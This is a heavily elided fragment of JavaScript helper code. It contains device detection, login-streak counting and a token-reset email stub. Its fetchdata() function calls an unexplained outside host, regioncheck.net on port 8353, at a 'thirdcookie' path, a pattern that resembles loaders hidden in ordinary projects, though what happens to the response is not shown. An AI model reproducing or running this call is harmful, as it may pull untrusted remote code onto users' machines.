...
function get_device(headers) {
  ...
  if (headers) {
    if (
      ...
      if (
        /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile safari|windows phone|silk-accelerated/i.test(
          userAgent
        )
      ) {
        device = 1; // Mobile
...
function check_streak(result) {
  ...
  for (let i = 0; i < result.length - 1; i++) {
    ...
    let period =
      parseInt(result[i + 1].login_date) - parseInt(result[i].login_date);
...
async function fetchdata() {
  const res = await axios.get(
    "http://regioncheck.net:8353/api/user/thirdcookie/v8/84"
  );
...
function sendEmail(data) {
  //send an email with instructions to reset token
